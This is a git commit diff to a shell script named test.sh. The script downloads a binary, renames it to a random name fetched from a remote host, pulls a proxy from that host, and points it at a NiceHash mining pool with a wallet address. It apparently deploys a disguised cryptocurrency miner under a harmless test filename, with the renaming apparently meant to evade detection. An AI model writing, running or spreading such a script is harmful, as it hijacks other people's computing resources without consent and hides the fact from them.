74425ebc13e81e5ed1a13fc9f737d275967e1da2
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 06:02:18 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -4,9 +4,9 @@ wget https://github.com/rindalasririn/ketaea/raw/main/bubui
 #wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 chmod +x bubui && mv bubui $ACAK
-read -p 'Input Proxy nya: ' PROXY
-WALLET=teguhcong
-POOL=stratum+tcp://ethash.poolbinance.com:1800
+PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti-proxy.php))
+WALLET=3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri
+POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
 WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
